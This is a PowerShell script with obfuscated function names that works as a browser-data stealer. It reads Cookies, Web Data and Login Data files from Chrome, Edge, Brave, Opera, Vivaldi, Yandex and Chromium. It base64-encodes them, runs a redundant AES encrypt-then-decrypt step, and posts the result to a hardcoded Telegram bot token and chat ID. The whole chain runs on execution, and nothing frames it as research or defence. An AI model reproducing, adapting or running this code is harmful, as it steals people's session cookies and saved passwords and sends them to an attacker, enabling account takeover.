$A1 = "8065834690:AAE8me5r1T3TxRzPs-ucwHbjzHJzDuTQ8V0"
$B2 = "7566413634"

Function Zz {
    param (
        [string]$D1,
        [string]$K1 = "MySuperSecretKey123456"
    )
    $C1 = New-Object System.Security.Cryptography.AesManaged
    $C1.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $C1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $C1.Key = [System.Text.Encoding]::UTF8.GetBytes($K1.PadRight(32, '0'))
    $C1.GenerateIV()
    $E1 = $C1.CreateEncryptor()
    $B1 = [System.Text.Encoding]::UTF8.GetBytes($D1)
    $F1 = $E1.TransformFinalBlock($B1, 0, $B1.Length)
    $M1 = New-Object System.IO.MemoryStream
    $M1.Write($C1.IV, 0, $C1.IV.Length)
    $M1.Write($F1, 0, $F1.Length)
    $R1 = $M1.ToArray()
    [Convert]::ToBase64String($R1)
}

Function Xx {
    $P1 = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        "$env:APPDATA\Opera Software\Opera GX Stable\Cookies",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Chromium\User Data\Default\Cookies",

        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data",
        "$env:APPDATA\Opera Software\Opera GX Stable\Web Data",
        "$env:APPDATA\Opera Software\Opera Stable\Web Data",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Web Data",
        "$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data",

        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data"
    )

    $Zz = ""

    foreach ($Q1 in $P1) {
        if (Test-Path $Q1) {
            try {
                $Zz += ('=' * 3) + $Q1 + "`n"
                $D2 = [System.IO.File]::ReadAllBytes($Q1)
                if ($D2.Length -gt 4000) {
                    $Zz += "Data too large to send, skipping..." + "`n"
                } else {
                    $Zz += [Convert]::ToBase64String($D2) + "`n"
                }
            } catch {
                $Zz += ("err@:" + $Q1 + " - " + $_.Exception.Message + "`n")
            }
        }
    }
    return $Zz
}

Function Yy {
    param ([string]$Msg)

    $uri = "https://api.telegram.org/bot$A1/sendMessage"

    $body = @{
        "chat_id" = $B2
        "text" = $Msg
        "parse_mode" = "Markdown"
    }

    try {
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body
        if ($response.ok -ne $true) {
            Write-Host "Failed to send message: $($response.description)"
        }
    } catch {
        Write-Host "Error sending message: $($_.Exception.Message)"
    }
}

Function DecryptMessage {
    param (
        [string]$base64Message,
        [string]$K1 = "MySuperSecretKey123456"
    )

    # Convert base64 message to bytes
    $encryptedData = [Convert]::FromBase64String($base64Message)

    # Extract the IV (first 16 bytes) and the ciphertext (rest of the bytes)
    $IV = $encryptedData[0..15] # First 16 bytes are the IV
    $cipherText = $encryptedData[16..($encryptedData.Length - 1)] # Rest is the actual encrypted data

    # Create AES object and set properties
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($K1.PadRight(32, '0'))  # Ensure the key is 32 bytes
    $aes.IV = $IV

    # Create the decryptor
    $decryptor = $aes.CreateDecryptor()

    # Decrypt the data
    $plainTextBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
    
    # Convert bytes back to string
    $plainText = [System.Text.Encoding]::UTF8.GetString($plainTextBytes)
    return $plainText
}

# Entry Point
$DUMP = Xx
$ENC = Zz -D1 $DUMP

# Decrypt the base64 encoded encrypted data to get raw cookies/web data
$DECRYPTED = DecryptMessage -base64Message $ENC

# Send the decrypted data to Telegram
Yy -Msg ("Raw Data:`n`n" + $DECRYPTED)
